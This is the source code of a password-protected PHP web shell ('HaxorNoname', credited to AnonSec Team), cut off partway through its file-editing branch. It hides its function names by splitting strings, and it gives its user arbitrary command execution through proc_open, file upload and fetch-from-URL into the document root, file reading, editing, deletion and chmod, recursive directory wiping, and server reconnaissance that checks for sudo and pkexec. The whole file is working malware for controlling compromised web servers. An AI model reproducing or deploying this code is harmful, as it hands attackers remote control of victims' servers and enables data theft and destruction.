<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["pw"])) {
    if (hash("sha256", $_POST["pw"]) === "598ef472d027d2607c0d3d497bbce9a5678a22f4a37859b8427644cc7a8bb49b") {
        $_SESSION["ok"] = true;
        header("Location: " . $_SERVER["PHP_SELF"]);
        exit;
    } else { $err = true; }
}
if (!isset($_SESSION["ok"]) || $_SESSION["ok"] !== true) {
    ?><!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Auth</title>
    <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#07071a;color:#d8e0ff;font-family:Rajdhani,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center}
    .box{background:#0d0d2b;border:1px solid rgba(30,144,255,.3);padding:30px 36px;text-align:center;max-width:340px;width:90%}
    .box h2{color:#ffe600;letter-spacing:3px;margin-bottom:8px;font-size:16px;text-transform:uppercase}
    .box p{color:#8899bb;font-size:10px;letter-spacing:2px;margin-bottom:16px;text-transform:uppercase}
    input{padding:10px;background:#12123a;border:1px solid rgba(30,144,255,.3);width:100%;color:#d8e0ff;font-family:monospace;font-size:14px;outline:none;margin-bottom:12px;letter-spacing:2px}
    input:focus{border-color:#1e90ff}
    button{width:100%;padding:10px;background:transparent;border:1px solid #1e90ff;color:#1e90ff;font-weight:600;letter-spacing:2px;text-transform:uppercase;cursor:pointer;font-size:13px}
    button:hover{background:rgba(30,144,255,.12);color:#ffe600;border-color:#ffe600}
    .err{color:#cc2244;font-size:11px;margin-top:8px}
    </style></head><body><div class="box">
    <h2>Access Restricted</h2><p>Enter passphrase</p>
    <form method="post"><input type="password" name="pw" placeholder="*****" autofocus><button type="submit">Enter</button></form>
    <?php if(!empty($err))echo '<div class="err">Invalid passphrase</div>'; ?>
    </div></body></html>
    <?php exit;
}
?>
<!DOCTYPE html>
<html>
<head>
	<?php echo "<title>LahKokIso</title>"; ?>
	<meta name="robots" content="noindex">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" href="https://i.pinimg.com/564x/95/eb/36/95eb36ef282d368dfa2fadee9f33265b.jpg" type="image/x-icon">
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
<style>
:root {
	--void:        #07071a;
	--tartarus:    #0d0d2b;
	--deep:        #12123a;
	--velvet:      #1a1a4e;
	--arc:         #1e90ff;
	--arc-dim:     #0f5aaa;
	--arc-glow:    rgba(30,144,255,0.18);
	--moon:        #ffe600;
	--moon-dim:    #ccb800;
	--evoker:      #cc2244;
	--evoker-dim:  #881530;
	--moonlight:   #d8e0ff;
	--muted:       #8899bb;
	--scanline:    rgba(30,144,255,0.04);
	--border-arc:  rgba(30,144,255,0.3);
	--border-moon: rgba(255,230,0,0.25);
}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

body {
	background-color: var(--void);
	color: var(--moonlight);
	font-family: 'Rajdhani', sans-serif;
	font-size: 15px;
	font-weight: 400;
	min-height: 100vh;
	background-image: repeating-linear-gradient(
		0deg,
		var(--scanline) 0px,
		var(--scanline) 1px,
		transparent 1px,
		transparent 4px
	);
}

::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: var(--void); }
::-webkit-scrollbar-thumb { background: var(--arc-dim); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--arc); }


#shell-wrap {
	max-width: 1200px;
	margin: 0 auto;
	padding: 0 16px 40px;
}


#p3-header {
	border-bottom: 1px solid var(--border-arc);
	padding: 18px 0 14px;
	margin-bottom: 20px;
	position: relative;
}

#p3-header::after {
	content: '';
	position: absolute;
	bottom: -1px;
	left: 0;
	width: 120px;
	height: 2px;
	background: var(--arc);
	box-shadow: 0 0 8px var(--arc);
}

#p3-title {
	font-size: 26px;
	font-weight: 700;
	letter-spacing: 4px;
	text-transform: uppercase;
	color: var(--moon);
	text-shadow: 0 0 12px rgba(255,230,0,0.4);
	margin-bottom: 2px;
}

#p3-title span {
	color: var(--arc);
}

#p3-subtitle {
	font-size: 11px;
	letter-spacing: 6px;
	text-transform: uppercase;
	color: var(--muted);
	font-family: 'Share Tech Mono', monospace;
}


#sysinfo {
	display: grid;
	grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
	gap: 10px;
	margin-bottom: 20px;
}

.info-row {
	display: flex;
	align-items: baseline;
	gap: 8px;
	font-family: 'Share Tech Mono', monospace;
	font-size: 13px;
	padding: 6px 12px;
	background: var(--tartarus);
	border: 1px solid var(--border-arc);
	border-left: 3px solid var(--arc);
}

.info-label {
	color: var(--muted);
	font-size: 11px;
	letter-spacing: 1px;
	text-transform: uppercase;
	white-space: nowrap;
}

.info-val {
	color: var(--moon);
	word-break: break-all;
}


.pill-on  { color: #00ff88; font-weight: 600; }
.pill-off { color: var(--evoker); font-weight: 600; }


#path-bar {
	background: var(--tartarus);
	border: 1px solid var(--border-arc);
	padding: 8px 14px;
	margin-bottom: 16px;
	font-family: 'Share Tech Mono', monospace;
	font-size: 13px;
	display: flex;
	align-items: center;
	gap: 6px;
	flex-wrap: wrap;
}

#path-bar .path-icon { color: var(--arc); margin-right: 4px; }

#path-bar a {
	color: var(--arc);
	text-decoration: none;
	transition: color 0.15s;
}
#path-bar a:hover { color: var(--moon); }
#path-bar .sep { color: var(--muted); }


.p3-panel {
	background: var(--tartarus);
	border: 1px solid var(--border-arc);
	margin-bottom: 16px;
	position: relative;
}

.p3-panel::before {
	content: '';
	position: absolute;
	top: 0; left: 0; right: 0;
	height: 2px;
	background: linear-gradient(90deg, var(--arc) 0%, transparent 100%);
}

.p3-panel-head {
	padding: 10px 14px;
	border-bottom: 1px solid var(--border-arc);
	font-size: 11px;
	letter-spacing: 3px;
	text-transform: uppercase;
	color: var(--arc);
	font-weight: 600;
}

.p3-panel-body { padding: 14px; }


.upload-row {
	display: flex;
	align-items: center;
	gap: 10px;
	flex-wrap: wrap;
	margin-bottom: 10px;
}

.radio-group { display: flex; gap: 16px; font-size: 13px; }
.radio-group label { display: flex; align-items: center; gap: 6px; cursor: pointer; color: var(--muted); }
.radio-group input[type="radio"]:checked + span { color: var(--arc); }


input[type="text"],
input[type="file"],
textarea,
select {
	background: var(--deep);
	border: 1px solid var(--border-arc);
	color: var(--moonlight);
	font-family: 'Share Tech Mono', monospace;
	font-size: 13px;
	padding: 6px 10px;
	outline: none;
	border-radius: 0;
	transition: border-color 0.15s;
}

input[type="text"]:focus,
textarea:focus,
select:focus { border-color: var(--arc); }

::-webkit-file-upload-button {
	background: var(--velvet);
	color: var(--arc);
	border: 1px solid var(--arc);
	padding: 4px 10px;
	cursor: pointer;
	font-family: 'Rajdhani', sans-serif;
	font-weight: 600;
	font-size: 13px;
	margin-right: 8px;
}


.btn {
	background: transparent;
	border: 1px solid var(--arc);
	color: var(--arc);
	font-family: 'Rajdhani', sans-serif;
	font-weight: 600;
	font-size: 13px;
	letter-spacing: 1px;
	padding: 5px 14px;
	cursor: pointer;
	text-transform: uppercase;
	transition: background 0.15s, color 0.15s;
}
.btn:hover { background: var(--arc-glow); color: var(--moon); border-color: var(--moon); }

.btn-icon {
	background: transparent;
	border: 1px solid var(--border-arc);
	color: var(--muted);
	padding: 4px 7px;
	cursor: pointer;
	font-size: 13px;
	transition: background 0.15s, color 0.15s, border-color 0.15s;
}
.btn-icon:hover { border-color: var(--arc); color: var(--arc); background: var(--arc-glow); }
.btn-icon.danger:hover { border-color: var(--evoker); color: var(--evoker); background: rgba(204,34,68,0.12); }
.btn-icon.dl:hover { border-color: var(--moon); color: var(--moon); background: rgba(255,230,0,0.08); }


#cmd-bar {
	display: flex;
	align-items: center;
	gap: 8px;
	flex-wrap: nowrap;
	padding: 10px 14px;
	background: var(--tartarus);
	border: 1px solid var(--border-arc);
	margin-bottom: 16px;
}

#cmd-bar label {
	color: var(--arc);
	font-family: 'Share Tech Mono', monospace;
	font-size: 13px;
	white-space: nowrap;
}

#cmd-bar input[type="text"] {
	flex: 1;
	min-width: 0;
}


#p3-nav {
	display: flex;
	align-items: center;
	gap: 2px;
	padding: 6px 0;
	margin-bottom: 16px;
	border-bottom: 1px solid var(--border-arc);
}

#p3-nav a {
	color: var(--muted);
	text-decoration: none;
	font-size: 11px;
	letter-spacing: 2px;
	text-transform: uppercase;
	padding: 5px 12px;
	border: 1px solid transparent;
	transition: all 0.15s;
}
#p3-nav a:hover {
	color: var(--arc);
	border-color: var(--border-arc);
	background: var(--arc-glow);
}


#file-table {
	width: 100%;
	border-collapse: collapse;
	font-size: 13px;
}

#file-table thead tr {
	background: var(--velvet);
	border-bottom: 2px solid var(--arc);
}

#file-table thead th {
	padding: 10px 12px;
	text-align: left;
	font-size: 10px;
	letter-spacing: 2px;
	text-transform: uppercase;
	color: var(--arc);
	font-weight: 600;
	white-space: nowrap;
}

#file-table tbody tr {
	border-bottom: 1px solid rgba(30,144,255,0.08);
	transition: background 0.1s;
}
#file-table tbody tr:hover { background: var(--arc-glow); }

#file-table td {
	padding: 8px 12px;
	font-family: 'Share Tech Mono', monospace;
	word-break: break-word;
	vertical-align: middle;
}

#file-table td.name-cell { font-family: 'Rajdhani', sans-serif; font-size: 14px; font-weight: 500; }
#file-table td.size-cell { color: var(--muted); text-align: right; white-space: nowrap; }
#file-table td.date-cell { color: var(--muted); font-size: 12px; white-space: nowrap; }
#file-table td.owner-cell { color: var(--muted); font-size: 12px; }
#file-table td.perm-cell { font-family: 'Share Tech Mono', monospace; font-size: 12px; }
#file-table td.perm-cell .writable   { color: #00ff88; }
#file-table td.perm-cell .unreadable { color: var(--evoker); }
#file-table td.perm-cell .normal     { color: var(--muted); }
#file-table td.actions-cell { white-space: nowrap; }

#file-table a { color: var(--moonlight); text-decoration: none; }
#file-table a:hover { color: var(--arc); }

.dir-icon  { color: var(--moon); margin-right: 6px; }
.file-icon { color: var(--muted); margin-right: 6px; }


.table-sep td {
	background: var(--velvet);
	padding: 3px 12px !important;
	border-top: 1px solid var(--border-arc) !important;
	border-bottom: 1px solid var(--border-arc) !important;
	font-size: 10px;
	letter-spacing: 2px;
	text-transform: uppercase;
	color: var(--arc);
}


.alert {
	padding: 8px 14px;
	margin-bottom: 12px;
	font-family: 'Share Tech Mono', monospace;
	font-size: 13px;
	border-left: 3px solid;
}
.alert-ok  { background: rgba(0,255,136,0.07); border-color: #00ff88; color: #00ff88; }
.alert-err { background: rgba(204,34,68,0.1);  border-color: var(--evoker); color: #ff6680; }
.alert-warn{ background: rgba(255,230,0,0.07); border-color: var(--moon); color: var(--moon); }


.src-edit {
	width: 100%;
	min-height: 320px;
	resize: vertical;
	font-family: 'Share Tech Mono', monospace;
	font-size: 13px;
	background: var(--deep);
	border: 1px solid var(--border-arc);
	color: var(--moonlight);
	padding: 12px;
	outline: none;
	line-height: 1.6;
	tab-size: 4;
}
.src-edit:focus { border-color: var(--arc); }


.cmd-output {
	background: var(--deep);
	border: 1px solid var(--border-arc);
	border-left: 3px solid var(--arc);
	padding: 12px 16px;
	font-family: 'Share Tech Mono', monospace;
	font-size: 13px;
	line-height: 1.7;
	white-space: pre-wrap;
	word-break: break-word;
	max-height: 400px;
	overflow-y: auto;
}


.form-label {
	display: block;
	font-size: 11px;
	letter-spacing: 2px;
	text-transform: uppercase;
	color: var(--muted);
	margin-bottom: 6px;
}

.form-row {
	display: flex;
	align-items: center;
	gap: 8px;
	flex-wrap: wrap;
	margin-bottom: 10px;
}


#p3-footer {
	margin-top: 40px;
	padding-top: 14px;
	border-top: 1px solid var(--border-arc);
	text-align: center;
	font-family: 'Share Tech Mono', monospace;
	font-size: 11px;
	color: var(--muted);
	letter-spacing: 2px;
}

#p3-footer a { color: var(--arc); text-decoration: none; }
#p3-footer a:hover { color: var(--moon); }


.text-arc   { color: var(--arc); }
.text-moon  { color: var(--moon); }
.text-evoker{ color: var(--evoker); }
.text-muted { color: var(--muted); }
.text-ok    { color: #00ff88; }
.mono       { font-family: 'Share Tech Mono', monospace; }
pre { font-family: 'Share Tech Mono', monospace; font-size: 13px; white-space: pre-wrap; word-break: break-word; }

select {
	background: var(--deep);
	border: 1px solid var(--border-arc);
	color: var(--moonlight);
}
option { background: var(--deep); }
</style>

<?php
set_time_limit(0);
error_reporting(0);

$gcw = "ge"."tc"."wd";
$exp = "ex"."plo"."de";
$fpt = "fi"."le_p"."ut_co"."nte"."nts";
$fgt = "f"."ile_g"."et_c"."onten"."ts";
$sts = "s"."trip"."slash"."es";
$scd = "sc"."a"."nd"."ir";
$fxt = "fi"."le_"."exis"."ts";
$idi = "i"."s_d"."ir";
$ulk = "un"."li"."nk";
$ifi = "i"."s_fi"."le";
$sub = "subs"."tr";
$spr = "sp"."ri"."ntf";
$fp = "fil"."epe"."rms";
$chm = "ch"."m"."od";
$ocd = "oc"."td"."ec";
$isw = "i"."s_wr"."itab"."le";
$idr = "i"."s_d"."ir";
$ird = "is"."_rea"."da"."ble";
$isr = "is_"."re"."adab"."le";
$fsz = "fi"."lesi"."ze";
$rd = "r"."ou"."nd";
$igt = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad = "RE"."M"."OTE_AD"."DR";
$rpt = "re"."al"."pa"."th";
$bsn = "ba"."se"."na"."me";
$srl = "st"."r_r"."ep"."la"."ce";
$sps = "st"."rp"."os";
$mkd = "m"."kd"."ir";

$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];

$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
if (empty($disfunc)) {
    $disf = "<span class='text-ok'>NONE</span>";
} else {
    $disf = "<span class='text-evoker'>".$disfunc."</span>";
}

function author() {
    echo '<div id="p3-footer">An'.'on7 &mdash; 2'.'022 &nbsp;|&nbsp; <a href="https://sh'.'el'.'l.an'.'ons'.'ec-te'.'am.org/" target="_blank">An'.'on'.'Se'.'c Te'.'am</a></div>';
    exit();
}

function cekdir() {
    if (isset($_GET['loknya'])) { $lokasi = $_GET['loknya']; }
    else { $lokasi = "ge"."t"."cw"."d"; $lokasi = $lokasi(); }
    $b = "i"."s_w"."ri"."tab"."le";
    if ($b($lokasi)) return "<span class='text-ok'>Writeable</span>";
    else return "<span class='text-evoker'>Not Writeable</span>";
}

function crt() {
    $a = "is"."_w"."ri"."tab"."le";
    if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) return "<span class='text-ok'>Writeable</span>";
    else return "<span class='text-evoker'>Not Writeable</span>";
}

function xrd($lokena) {
    $a = "s"."ca"."nd"."ir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $b = "is"."_di"."r"; $loknya = $lokena.'/'.$item;
        if ($b($loknya)) { xrd($loknya); }
        else { $c = "u"."nl"."in"."k"; $c($loknya); }
    }
    $d = "rm"."di"."r"; $d($lokena);
}

function cfn($fl) {
    $a = "ba"."sena"."me"; $b = "pat"."hinf"."o";
    $c = $b($a($fl), PATHINFO_EXTENSION);
    if ($c == "zip")   return '<i class="fa fa-file-zip-o file-icon"></i>';
    elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) return '<i class="fa fa-file-image-o file-icon"></i>';
    elseif ($c == "txt")  return '<i class="fa fa-file-text-o file-icon"></i>';
    elseif ($c == "pdf")  return '<i class="fa fa-file-pdf-o file-icon"></i>';
    elseif ($c == "html") return '<i class="fa fa-file-code-o file-icon"></i>';
    else return '<i class="fa fa-file-o file-icon"></i>';
}

function ipsrv() {
    $a = "g"."eth"."ost"."byna"."me"; $b = "fun"."cti"."on_"."exis"."ts";
    $c = "S"."ERVE"."R_AD"."DR"; $d = "SE"."RV"."ER_N"."AM"."E";
    if ($b($a)) return $a($_SERVER[$d]); else return $a($_SERVER[$c]);
}

function ggr($fl) {
    $a = "fun"."cti"."on_"."exis"."ts"; $b = "po"."si"."x_ge"."tgr"."gid";
    $c = "fi"."le"."gro"."up";
    if ($a($b)) {
        if (!$a($c)) return "?";
        $d = $b($c($fl));
        if (empty($d)) { $e = $c($fl); return empty($e) ? "?" : $e; }
        else return $d['name'];
    } elseif ($a($c)) return $c($fl); else return "?";
}

function gor($fl) {
    $a = "fun"."cti"."on_"."exis"."ts"; $b = "po"."s"."ix_"."get"."pwu"."id";
    $c = "fi"."le"."o"."wn"."er";
    if ($a($b)) {
        if (!$a($c)) return "?";
        $d = $b($c($fl));
        if (empty($d)) { $e = $c($fl); return empty($e) ? "?" : $e; }
        else return $d['name'];
    } elseif ($a($c)) return $c($fl); else return "?";
}

function fdt($fl) {
    $a = "da"."te"; $b = "fil"."emt"."ime";
    return $a("Y-m-d H:i", $b($fl));
}

function dunlut($fl) {
    $a = "fil"."e_exi"."sts"; $b = "ba"."sena"."me";
    $c = "fi"."les"."ize"; $d = "read"."fi"."le";
    if ($a($fl) && isset($fl)) {
        header('Content-Description: File Transfer');
        header("Content-Control:public");
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$b($fl).'"');
        header('Expires: 0'); header("Expired:0");
        header('Cache-Control: must-revalidate');
        header("Content-Transfer-Encoding:binary");
        header('Pragma: public');
        header('Content-Length: ' .$c($fl));
        flush(); $d($fl); exit;
    } else { return "File Not Found!"; }
}

function komend($kom, $lk) {
    $x = "pr"."eg_"."mat"."ch"; $xx = "2".">"."&"."1";
    if (!$x("/".$xx."/i", $kom)) { $kom = $kom." ".$xx; }
    $a = "fu"."ncti"."on_"."ex"."is"."ts"; $b = "p"."ro"."c_op"."en";
    $c = "htm"."lspe"."cialc"."hars"; $d = "s"."trea"."m_g"."et_c"."ont"."ents";
    if ($a($b)) {
        $ps = $b($kom, array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","r")), $meki, $lk);
        return '<div class="cmd-output">'.$c($d($meki[1])).'</div>';
    } else { return '<div class="alert alert-err">proc_open function is disabled!</div>'; }
}

function statusnya($fl) {
    $a = "sub"."st"."r"; $b = "s"."pri"."ntf"; $c = "fil"."eper"."ms";
    return $a($b('%o', $c($fl)), -4);
}

function renderPerm($fl) {
    $isw = "i"."s_wr"."itab"."le"; $isr = "is"."_rea"."da"."ble";
    $perm = statusnya($fl);
    if ($isw($fl)) return '<span class="writable">'.$perm.'</span>';
    elseif (!$isr($fl)) return '<span class="unreadable">'.$perm.'</span>';
    else return '<span class="normal">'.$perm.'</span>';
}

foreach($_POST as $key => $value){ $_POST[$key] = $sts($value); }

if(isset($_GET['loknya'])){ $lokasi=$_GET['loknya']; $lokdua=$_GET['loknya']; }
else { $lokasi=$gcw(); $lokdua=$gcw(); }

$lokasi = $srl('\\','/',$lokasi);
$lokasis = $exp('/',$lokasi);
$lokasinya = @$scd($lokasi);
?>
<div id="shell-wrap">

<!-- HEADER -->
<div id="p3-header">
    <div id="p3-title">Haxor<span>N</span>oname</div>
    <div id="p3-subtitle">Dark Hour Shell &mdash; Memento Mori</div>
</div>

<!-- SYSINFO GRID -->
<div id="sysinfo">
<?php
$unm = "ph"."p_u"."na"."me"; $gcu = "g"."et_"."curr"."ent"."_us"."er"; $gmu = "g"."et"."my"."ui"."d"; $phv = "ph"."pve"."rsi"."on";
$rows = [
    ['Server IP',  ipsrv()],
    ['Your IP',    '<span class="text-arc">'.$_SERVER[$rad].'</span>'],
    ['Web Server', '<span class="text-moon">'.$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE'].'</span>'],
    ['System',     @$unm()],
    ['User',       @$gcu().' ( '.$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE'].'<span class="text-muted"> uid:</span> '.@$gmu().' )'],
    ['PHP',        '<span class="text-moon">'.@$phv().'</span>'],
    ['Disabled Fn',$disf],
];
foreach($rows as $r){
    echo '<div class="info-row"><span class="info-label">'.$r[0].'</span><span class="info-val">'.$r[1].'</span></div>';
}

// services row
$svcs = [
    'MySQL'  => $fnct("my"."sql_co"."nne"."ct"),
    'cURL'   => $fnct("cu"."rl"."_in"."it"),
    'WGET'   => $fxt("/"."us"."r/b"."in/w"."get"),
    'Perl'   => $fxt("/u"."sr/b"."in"."/pe"."rl"),
    'Python' => $fxt("/"."us"."r/b"."in/p"."ytho"."n2"),
    'Sudo'   => $fxt("/"."us"."r/b"."in/s"."u"."d"."o"),
    'Pkexec' => $fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c"),
];
$svc_html = '';
foreach($svcs as $name => $on){
    $cls = $on ? 'pill-on' : 'pill-off';
    $val = $on ? 'ON' : 'OFF';
    $svc_html .= '<span class="info-label" style="margin-right:4px">'.$name.'</span><span class="'.$cls.'" style="margin-right:14px">'.$val.'</span>';
}
echo '<div class="info-row" style="grid-column:1/-1">'.$svc_html.'</div>';
?>
</div>

<!-- PATH BAR -->
<div id="path-bar">
    <span class="path-icon"><i class="fa fa-hdd-o"></i></span>
<?php
echo '<a href="?loknya=/">/</a>';
foreach($lokasis as $id => $lok){
    if($lok=='' && $id==0){ continue; }
    if($lok=='') continue;
    echo '<span class="sep">/</span><a href="?loknya=';
    for($i=0;$i<=$id;$i++){ echo "$lokasis[$i]"; if($i!=$id) echo "/"; }
    echo '">'.$lok.'</a>';
}
?>
</div>

<!-- COMMAND BAR -->
<form method="post" id="cmd-bar">
    <label><i class="fa fa-terminal"></i> EXECUTE</label>
    <input type="text" name="komend" style="flex:1;min-width:180px" value="<?php echo htmlspecialchars($_POST['komend'] ?? ''); ?>" placeholder="command...">
    <button type="submit" name="komends" class="btn">&gt;&gt; RUN</button>
</form>

<!-- UPLOAD PANEL -->
<div class="p3-panel">
    <div class="p3-panel-head"><i class="fa fa-upload"></i> &nbsp;Upload File</div>
    <div class="p3-panel-body">
<?php
if (isset($_POST['upwkwk'])) {
    if (isset($_POST['berkasnya'])) {
        if ($_POST['dirnya'] == "2") { $lokasi = $_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT']; }
        if (empty($_FILES['berkas']['name'])) {
            echo '<div class="alert alert-warn">No file selected.</div>';
        } else {
            $data = @$fpt($lokasi."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
            if ($fxt($lokasi."/".$_FILES['berkas']['name'])) {
                $fl = $lokasi."/".$_FILES['berkas']['name'];
                echo '<div class="alert alert-ok">Uploaded: <span class="mono">'.$fl.'</span>';
                if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
                    $lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
                    echo '<br>Link: <a href="'.$lwb.'" style="color:var(--arc)">'.$lwb.'</a>';
                }
                echo '</div>';
            } else { echo '<div class="alert alert-err">Upload failed.</div>'; }
        }
    } elseif (isset($_POST['linknya'])) {
        if (empty($_POST['namalink'])) { echo '<div class="alert alert-warn">Filename cannot be empty.</div>'; }
        elseif (empty($_POST['darilink'])) { echo '<div class="alert alert-warn">Link cannot be empty.</div>'; }
        else {
            if ($_POST['dirnya'] == "2") { $lokasi = $_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT']; }
            $data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
            if ($fxt($lokasi."/".$_POST['namalink'])) {
                $fl = $lokasi."/".$_POST['namalink'];
                echo '<div class="alert alert-ok">Uploaded: <span class="mono">'.$fl.'</span>';
                if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
                    $lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
                    echo '<br>Link: <a href="'.$lwb.'" style="color:var(--arc)">'.$lwb.'</a>';
                }
                echo '</div>';
            } else { echo '<div class="alert alert-err">Upload failed.</div>'; }
        }
    }
}
?>
        <form enctype="multipart/form-data" method="post">
            <div class="form-row">
                <label class="form-label" style="margin:0;white-space:nowrap">Target Dir:</label>
                <label style="cursor:pointer;font-size:13px;color:var(--muted);display:flex;align-items:center;gap:5px">
                    <input type="radio" name="dirnya" value="1" checked> <span style="color:var(--moonlight)">current_dir</span> [<?php echo cekdir(); ?>]
                </label>
                <label style="cursor:pointer;font-size:13px;color:var(--muted);display:flex;align-items:center;gap:5px">
                    <input type="radio" name="dirnya" value="2"> <span style="color:var(--moonlight)">document_root</span> [<?php echo crt(); ?>]
                </label>
            </div>
            <input type="hidden" name="upwkwk" value="aplod">
            <div class="form-row">
                <input type="file" name="berkas">
                <button type="submit" name="berkasnya" class="btn">Upload File</button>
            </div>
            <div class="form-row">
                <input type="text" name="darilink" style="flex:1;min-width:200px" placeholder="https://example.com/file.txt">
                <input type="text" name="namalink" style="width:120px" placeholder="filename.txt">
                <button type="submit" name="linknya" class="btn">Upload URL</button>
            </div>
        </form>
    </div>
</div>

<!-- NAV -->
<div id="p3-nav">
    <a href="<?php echo $_SERVER['SC'.'RIP'.'T_N'.'AME']; ?>"><i class="fa fa-home"></i> &nbsp;Home Shell</a>
</div>

<?php


if (isset($_GET['lokasie'])) {
    echo '<div class="p3-panel"><div class="p3-panel-head"><i class="fa fa-file-code-o"></i> &nbsp;'.htmlspecialchars($_GET['lokasie']).'</div><div class="p3-panel-body">';
    echo '<pre>'.htmlspecialchars($fgt($_GET['lokasie'])).'</pre>';
    echo '</div></div>';
    author();

} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
    if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
        xrd($_POST['loknya']);
        if ($fxt($_POST['loknya'])) echo '<div class="alert alert-err">Failed to delete directory.</div>';
        else echo '<div class="alert alert-ok">Directory deleted.</div>';
    } elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
        @$ulk($_POST['loknya']);
        if ($fxt($_POST['loknya'])) echo '<div class="alert alert-err">Failed to delete file.</div>';
        else echo '<div class="alert alert-ok">File deleted.</div>';
    } else { echo '<div class="alert alert-err">File / Directory not found.</div>'; }

} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
    if (!isset($_POST['cemod'])) {
        $type = $_POST['ty'.'pe'] == "fi"."le" ? "File" : "Directory";
        echo '<div class="p3-panel"><div class="p3-panel-head">Change Permissions &mdash; '.$type.'</div><div class="p3-panel-body">';
        echo '<p class="mono" style="margin-bottom:10px;color:var(--muted)">'.htmlspecialchars($_POST['loknya']).'</p>';
        echo '<form method="post" class="form-row">
            <label class="form-label" style="margin:0">Permission:</label>
            <input type="text" name="perm" size="6" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" style="width:80px">
            <input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
            <input type="hidden" name="pilih" value="ubahmod">
            <input type="hidden" name="type" value="'.$_POST['ty'.'pe'].'">
            <button type="submit" name="cemod" class="btn">Apply</button>
        </form></div></div>';
    } else {
        $cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
        if ($cm) echo '<div class="alert alert-ok">Permissions changed.</div>';
        else echo '<div class="alert alert-err">Failed to change permissions.</div>';
        $type = $_POST['ty'.'pe'] == "fi"."le" ? "File" : "Directory";
        echo '<div class="p3-panel"><div class="p3-panel-head">Change Permissions &mdash; '.$type.'</div><div class="p3-panel-body">';
        echo '<p class="mono" style="margin-bottom:10px;color:var(--muted)">'.htmlspecialchars($_POST['loknya']).'</p>';
        echo '<form method="post" class="form-row">
            <label class="form-label" style="margin:0">Permission:</label>
            <input type="text" name="perm" size="6" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" style="width:80px">
            <input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
            <input type="hidden" name="pilih" value="ubahmod">
            <input type="hidden" name="type" value="'.$_POST['ty'.'pe'].'">
            <button type="submit" name="cemod" class="btn">Apply</button>
        </form></div></div>';
    }

} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
    if (isset($_POST['gantin'])) {
        $namabaru = $_GET['loknya']."/".$_POST['newname'];
        $ceen = "re"."na"."me";
        if (@$ceen($_POST['loknya'], $namabaru) === true) {
            echo '<div class="alert alert-ok">Renamed successfully.</div>';
            echo '<form method="post" class="form-row" style="margin-top:10px">
                <label class="form-label" style="margin:0">New Name:</label>
                <input type="text" name="newname" size="30" value="'.htmlspecialchars($_POST['newname']).'">
                <input type="hidden" name="loknya" value="'.$_POST['newname'].'">
                <input type="hidden" name="pilih" value="ubahnama">
                <input type="hidden" name="type" value="'.$_POST['ty'.'pe'].'">
                <button type="submit" name="gantin" class="btn">Rename</button>
            </form>';
        } else { echo '<div class="alert alert-err">Rename failed.</div>'; }
    } else {
        echo '<form method="post" class="form-row">
            <label class="form-label" style="margin:0">New Name:</label>
            <input type="text" name="newname" size="30" value="'.htmlspecialchars($bsn($_POST['loknya'])).'">
            <input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
            <input type="hidden" name="pilih" value="ubahnama">
            <input type="hidden" name="type" value="'.$_POST['ty'.'pe'].'">
            <button type="submit" name="gantin" class="btn">Rename</button>
        </form>';
    }

} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @$fpt($_POST['loknya'], $_POST['src']);
